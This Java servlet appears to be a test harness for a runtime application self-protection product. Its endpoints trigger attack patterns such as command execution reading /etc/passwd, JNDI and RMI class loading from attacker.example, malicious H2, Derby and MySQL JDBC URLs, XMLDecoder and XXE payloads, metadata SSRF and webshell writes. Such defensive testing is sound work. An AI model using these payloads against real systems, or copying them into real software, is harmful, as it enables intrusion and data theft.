package io.ohmyrasp.playground.java17;

import java.beans.XMLDecoder;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.RandomAccessFile;
import java.io.Reader;
import java.lang.management.ManagementFactory;
import java.net.URI;
import java.net.URL;
import java.net.URLClassLoader;
import java.rmi.server.RMIClassLoader;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.zip.ZipEntry;
import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.management.StandardMBean;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.script.AbstractScriptEngine;
import javax.script.Bindings;
import javax.script.ScriptContext;
import javax.script.ScriptEngine;
import javax.script.SimpleBindings;
import javax.security.auth.login.AppConfigurationEntry;
import jakarta.servlet.ServletException;
import jakarta.servlet.annotation.MultipartConfig;
import jakarta.servlet.annotation.WebServlet;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import jakarta.servlet.http.Part;
import javax.tools.JavaCompiler;
import javax.tools.SimpleJavaFileObject;
import javax.tools.ToolProvider;
import javax.xml.XMLConstants;
import javax.xml.parsers.DocumentBuilderFactory;
import org.xml.sax.InputSource;

@WebServlet(urlPatterns = "/rasp/*")
@MultipartConfig
public final class Java17ProbeServlet extends HttpServlet {
  @Override
  protected void doGet(HttpServletRequest request, HttpServletResponse response)
      throws ServletException, IOException {
    String path = request.getPathInfo() == null ? "/" : request.getPathInfo();
    if ("/health".equals(path)) {
      send(response, "ok");
      return;
    }
    if ("/java17/normal".equals(path)) {
      runSafeCommand();
      runSafeDeserialization();
      runSafeFileAccess();
      runSafeArchiveAccess();
      runSafeClassLoaderAccess();
      runSafeJdbcAccess();
      runSafeScriptEval();
      runSafeCompilation();
      runSafeJaas();
      runSafeJmx();
      decodeXml(xmlDecoderSafePayload());
      parseXml("<root>safe</root>");
      new URL("https://example.com/public/api").openConnection();
      send(response, "java17 normal " + System.getProperty("java.version", "unknown"));
      return;
    }
    if ("/java17/command".equals(path)) {
      Process process = new ProcessBuilder("sh", "-c", "cat /etc/passwd").start();
      waitFor(process);
      send(response, "java17 command attempted");
      return;
    }
    if ("/java17/command-shell".equals(path)) {
      Process process = new ProcessBuilder("sh", "-c", "echo safe; id").start();
      waitFor(process);
      send(response, "java17 command shell attempted");
      return;
    }
    if ("/java17/jndi".equals(path)) {
      System.setProperty("com.sun.jndi.ldap.connect.timeout", "200");
      System.setProperty("com.sun.jndi.ldap.read.timeout", "200");
      try {
        new InitialContext().lookup("ldap://127.0.0.1:1389/Exploit");
      } catch (NamingException expected) {
        send(response, "java17 jndi attempted");
        return;
      }
      send(response, "java17 jndi completed");
      return;
    }
    if ("/java17/deserialization".equals(path)) {
      try {
        deserialize(serializedDescriptor("com.sun.rowset.JdbcRowSetImpl"));
      } catch (IOException | ClassNotFoundException expected) {
        send(response, "java17 deserialization attempted");
        return;
      }
      send(response, "java17 deserialization completed");
      return;
    }
    if ("/java17/file-read".equals(path)) {
      FileInputStream stream = new FileInputStream("/etc/passwd");
      stream.close();
      send(response, "java17 file read attempted");
      return;
    }
    if ("/java17/file-write".equals(path)) {
      writeWebrootScript();
      send(response, "java17 file write attempted");
      return;
    }
    if ("/java17/plugin/add".equals(path)) {
      int files = 0;
      for (Part part : request.getParts()) {
        if (part.getSubmittedFileName() != null) {
          files++;
        }
      }
      send(response, "java17 upload attempted " + files);
      return;
    }
    if ("/java17/archive-traversal".equals(path)) {
      writeArchiveTraversalEntry();
      send(response, "java17 archive traversal attempted");
      return;
    }
    if ("/java17/ssrf-metadata".equals(path)) {
      new URL("http://169.254.169.254/latest/meta-data/").openConnection();
      send(response, "java17 ssrf metadata attempted");
      return;
    }
    if ("/java17/ssrf-loopback".equals(path)) {
      new URL("http://127.0.0.1:8080/actuator/env").openConnection();
      send(response, "java17 ssrf loopback attempted");
      return;
    }
    if ("/java17/classloader".equals(path)) {
      URLClassLoader loader =
          new URLClassLoader(new URL[] {new URL("http://attacker.example/evil.jar")});
      loader.close();
      send(response, "java17 classloader attempted");
      return;
    }
    if ("/java17/rmi-classloader".equals(path)) {
      try {
        RMIClassLoader.loadClass("http://attacker.example/Exploit", "example.RemoteExploit");
      } catch (ClassNotFoundException expected) {
        send(response, "java17 rmi classloader attempted");
        return;
      }
      send(response, "java17 rmi classloader completed");
      return;
    }
    if ("/java17/jdbc-h2".equals(path)) {
      try {
        DriverManager.getConnection("jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://127.0.0.1/poc.sql'");
      } catch (SQLException expected) {
        send(response, "java17 jdbc h2 attempted");
        return;
      }
      send(response, "java17 jdbc h2 completed");
      return;
    }
    if ("/java17/jdbc-derby".equals(path)) {
      try {
        DriverManager.getConnection(
            "jdbc:derby:memory:test;create=true;init=CALL SQLJ.INSTALL_JAR('http://127.0.0.1/payload.jar','APP.PAYLOAD',0)");
      } catch (SQLException expected) {
        send(response, "java17 jdbc derby attempted");
        return;
      }
      send(response, "java17 jdbc derby completed");
      return;
    }
    if ("/java17/jdbc-mysql".equals(path)) {
      try {
        DriverManager.getConnection(
            "jdbc:mysql://attacker.example:3308/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor");
      } catch (SQLException expected) {
        send(response, "java17 jdbc mysql attempted");
        return;
      }
      send(response, "java17 jdbc mysql completed");
      return;
    }
    if ("/java17/script".equals(path)) {
      runScript("Java.type('java.lang.Runtime').getRuntime().exec('id')");
      send(response, "java17 script attempted");
      return;
    }
    if ("/java17/compile".equals(path)) {
      compile(
          "EvilCompile",
          "public class EvilCompile { void run() throws Exception { java.lang.Runtime.getRuntime().exec(\"id\"); } }");
      send(response, "java17 compile attempted");
      return;
    }
    if ("/java17/jaas".equals(path)) {
      Map<String, String> options = new HashMap<String, String>();
      options.put("user.provider.url", "ldap://java-chains:50389/x");
      options.put("useFirstPass", "true");
      new AppConfigurationEntry(
          "com.sun.security.auth.module.JndiLoginModule",
          AppConfigurationEntry.LoginModuleControlFlag.REQUIRED,
          options);
      send(response, "java17 jaas attempted");
      return;
    }
    if ("/java17/jmx-remote-config".equals(path)) {
      invokeJmx(
          "addNetworkConnector",
          new Object[] {"static:(vm://evil?brokerConfig=xbean:http://attacker.example/poc.xml)"},
          new String[] {String.class.getName()});
      send(response, "java17 jmx remote config attempted");
      return;
    }
    if ("/java17/jmx-file-write".equals(path)) {
      invokeJmx(
          "copyTo",
          new Object[] {"/opt/activemq/webapps/admin/shelljfr.jsp"},
          new String[] {String.class.getName()});
      send(response, "java17 jmx file write attempted");
      return;
    }
    if ("/java17/xml-decoder-runtime".equals(path)) {
      try {
        decodeXml(xmlDecoderRuntimePayload());
      } catch (ArrayIndexOutOfBoundsException expected) {
        // XMLDecoder can finish the side-effecting object graph and then find no root object.
      }
      send(response, "java17 xml decoder runtime attempted");
      return;
    }
    if ("/java17/xml-decoder-webshell".equals(path)) {
      try {
        decodeXml(xmlDecoderWebshellPayload());
      } catch (ArrayIndexOutOfBoundsException expected) {
        // XMLDecoder can finish the side-effecting object graph and then find no root object.
      }
      send(response, "java17 xml decoder webshell attempted");
      return;
    }
    if ("/java17/xxe-file".equals(path)) {
      parseXml(
          "<?xml version=\"1.0\"?>"
              + "<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
              + "<root>&xxe;</root>");
      send(response, "java17 xxe attempted");
      return;
    }
    response.setStatus(HttpServletResponse.SC_NOT_FOUND);
    send(response, "not found");
  }

  @Override
  protected void doPost(HttpServletRequest request, HttpServletResponse response)
      throws ServletException, IOException {
    doGet(request, response);
  }

  private static void runSafeCommand() throws IOException {
    Process process = new ProcessBuilder("/bin/true").start();
    waitFor(process);
  }

  private static void runSafeDeserialization() throws IOException {
    try {
      deserialize(serialize("safe-java17"));
    } catch (ClassNotFoundException exception) {
      throw new IOException("safe deserialization class was not available", exception);
    }
  }

  private static void runSafeFileAccess() throws IOException {
    File file = File.createTempFile("ohmyrasp-java17-safe", ".txt");
    try {
      FileOutputStream output = new FileOutputStream(file);
      output.write("safe".getBytes("UTF-8"));
      output.close();
      FileInputStream input = new FileInputStream(file);
      while (input.read() != -1) {
        // Drain the safe temporary file.
      }
      input.close();
      RandomAccessFile randomAccessFile = new RandomAccessFile(file, "r");
      randomAccessFile.close();
    } finally {
      file.delete();
    }
  }

  private static void writeWebrootScript() throws IOException {
    File directory = new File(System.getProperty("java.io.tmpdir"), "webapps/ROOT");
    if (!directory.exists() && !directory.mkdirs()) {
      throw new IOException("unable to create playground webroot directory");
    }
    File target = new File(directory, "shell.jsp");
    FileOutputStream output = new FileOutputStream(target);
    try {
      output.write("<% out.println(\"ohmyrasp\"); %>".getBytes("UTF-8"));
    } finally {
      output.close();
      target.delete();
    }
  }

  private static void runSafeArchiveAccess() throws IOException {
    String name = new ZipEntry("images/logo.png").getName();
    File file = File.createTempFile("ohmyrasp-java17-safe-archive", ".txt");
    try {
      FileOutputStream output = new FileOutputStream(file);
      output.write(name.getBytes("UTF-8"));
      output.close();
    } finally {
      file.delete();
    }
  }

  private static void runSafeClassLoaderAccess() throws IOException {
    URLClassLoader loader =
        new URLClassLoader(new URL[] {new File("/tmp/ohmyrasp-java17-safe.jar").toURI().toURL()});
    loader.close();
  }

  private static void runSafeJdbcAccess() {
    try {
      DriverManager.getConnection("jdbc:unknown:normal");
    } catch (SQLException ignored) {
      // The playground only verifies that ordinary JDBC URLs do not create RASP events.
    }
  }

  private static void runSafeScriptEval() throws IOException {
    runScript("1 + 1");
  }

  private static void runScript(String script) throws IOException {
    ScriptEngine engine = new LocalScriptEngineImpl();
    try {
      engine.eval(script);
    } catch (Exception exception) {
      throw new IOException("script smoke failed", exception);
    }
  }

  private static void runSafeCompilation() {
    compile("SafeCompile", "public class SafeCompile { int value() { return 1 + 1; } }");
  }

  private static void compile(String className, String source) {
    JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
    if (compiler == null) {
      throw new IllegalStateException("Java compiler unavailable");
    }
    JavaCompiler.CompilationTask task =
        compiler.getTask(
            null,
            null,
            null,
            Arrays.asList("-d", "/tmp"),
            null,
            Arrays.asList(new StringJavaSource(className, source)));
    task.call();
  }

  private static void runSafeJaas() {
    Map<String, String> options = new HashMap<String, String>();
    options.put("principal", "app/localhost@EXAMPLE.COM");
    new AppConfigurationEntry(
        "com.sun.security.auth.module.Krb5LoginModule",
        AppConfigurationEntry.LoginModuleControlFlag.REQUIRED,
        options);
  }

  private static void runSafeJmx() throws IOException {
    invokeJmx("echo", new Object[] {"hello"}, new String[] {String.class.getName()});
  }

  private static void invokeJmx(String operation, Object[] arguments, String[] signatures)
      throws IOException {
    try {
      MBeanServer server = ManagementFactory.getPlatformMBeanServer();
      ObjectName name =
          new ObjectName("ohmyrasp.java17:type=ServletBroker,name=n" + System.nanoTime());
      StandardMBean mbean = new StandardMBean(new ServletBroker(), ServletBrokerMBean.class);
      server.registerMBean(mbean, name);
      try {
        server.invoke(name, operation, arguments, signatures);
      } finally {
        if (server.isRegistered(name)) {
          server.unregisterMBean(name);
        }
      }
    } catch (RuntimeException exception) {
      throw exception;
    } catch (Exception exception) {
      throw new IOException("JMX smoke failed", exception);
    }
  }

  private static Object decodeXml(String payload) {
    XMLDecoder decoder = new XMLDecoder(new ByteArrayInputStream(payload.getBytes()));
    Object value = decoder.readObject();
    decoder.close();
    return value;
  }

  private static void parseXml(String xml) throws IOException {
    try {
      DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
      factory.setNamespaceAware(true);
      factory.setExpandEntityReferences(true);
      factory.setFeature("http://xml.org/sax/features/external-general-entities", true);
      factory.setFeature("http://xml.org/sax/features/external-parameter-entities", true);
      factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "all");
      factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "all");
      factory
          .newDocumentBuilder()
          .parse(new InputSource(new ByteArrayInputStream(xml.getBytes("UTF-8"))));
    } catch (RuntimeException exception) {
      throw exception;
    } catch (Exception exception) {
      throw new IOException("XML parse smoke failed", exception);
    }
  }

  private static void writeArchiveTraversalEntry() throws IOException {
    String name = new ZipEntry("../webapps/ROOT/shell.jsp").getName();
    File directory = new File(System.getProperty("java.io.tmpdir"), "ohmyrasp-java17-archive");
    if (!directory.exists() && !directory.mkdirs()) {
      throw new IOException("unable to create playground archive directory");
    }
    File target = new File(directory, "extracted.txt");
    FileOutputStream output = new FileOutputStream(target);
    try {
      output.write(name.getBytes("UTF-8"));
    } finally {
      output.close();
      target.delete();
    }
  }

  private static void waitFor(Process process) {
    try {
      process.waitFor();
    } catch (InterruptedException exception) {
      Thread.currentThread().interrupt();
      throw new IllegalStateException("interrupted while waiting for process", exception);
    }
  }

  private static void send(HttpServletResponse response, String text) throws IOException {
    response.setContentType("text/plain;charset=UTF-8");
    response.getWriter().println(text);
  }

  private static byte[] serialize(Object value) throws IOException {
    ByteArrayOutputStream output = new ByteArrayOutputStream();
    ObjectOutputStream stream = new ObjectOutputStream(output);
    stream.writeObject(value);
    stream.close();
    return output.toByteArray();
  }

  private static Object deserialize(byte[] value) throws IOException, ClassNotFoundException {
    ObjectInputStream stream = new ObjectInputStream(new ByteArrayInputStream(value));
    try {
      return stream.readObject();
    } finally {
      stream.close();
    }
  }

  private static byte[] serializedDescriptor(String className) throws IOException {
    ByteArrayOutputStream output = new ByteArrayOutputStream();
    DataOutputStream stream = new DataOutputStream(output);
    stream.writeShort(0xaced);
    stream.writeShort(5);
    stream.writeByte(0x73);
    stream.writeByte(0x72);
    stream.writeUTF(className);
    stream.writeLong(1L);
    stream.writeByte(2);
    stream.writeShort(0);
    stream.writeByte(0x78);
    stream.writeByte(0x70);
    stream.close();
    return output.toByteArray();
  }

  private static String xmlDecoderSafePayload() {
    return "<java version=\"11.0\" class=\"java.beans.XMLDecoder\">"
        + "<string>safe</string>"
        + "</java>";
  }

  private static String xmlDecoderRuntimePayload() {
    return "<java version=\"11.0\" class=\"java.beans.XMLDecoder\">"
        + "<void class=\"java.lang.ProcessBuilder\">"
        + "<array class=\"java.lang.String\" length=\"3\">"
        + "<void index=\"0\"><string>sh</string></void>"
        + "<void index=\"1\"><string>-c</string></void>"
        + "<void index=\"2\"><string>id</string></void>"
        + "</array>"
        + "<void method=\"start\"/>"
        + "</void>"
        + "</java>";
  }

  private static String xmlDecoderWebshellPayload() {
    return "<java version=\"11.0\" class=\"java.beans.XMLDecoder\">"
        + "<object class=\"java.io.PrintWriter\">"
        + "<string>/tmp/webapps/ROOT/shell.jsp</string>"
        + "</object>"
        + "</java>";
  }

  public interface ServletBrokerMBean {
    String echo(String value);

    String addNetworkConnector(String value);

    String copyTo(String path);
  }

  public static final class ServletBroker implements ServletBrokerMBean {
    @Override
    public String echo(String value) {
      return value;
    }

    @Override
    public String addNetworkConnector(String value) {
      return value;
    }

    @Override
    public String copyTo(String path) {
      return path;
    }
  }

  private static final class StringJavaSource extends SimpleJavaFileObject {
    private final String source;

    StringJavaSource(String className, String source) {
      super(URI.create("string:///" + className + ".java"), Kind.SOURCE);
      this.source = source;
    }

    @Override
    public CharSequence getCharContent(boolean ignoreEncodingErrors) {
      return source;
    }
  }

  private static final class LocalScriptEngineImpl extends AbstractScriptEngine {
    @Override
    public Object eval(String script, ScriptContext context) {
      return script;
    }

    @Override
    public Object eval(Reader reader, ScriptContext context) {
      return null;
    }

    @Override
    public Bindings createBindings() {
      return new SimpleBindings();
    }

    @Override
    public javax.script.ScriptEngineFactory getFactory() {
      return null;
    }
  }
}
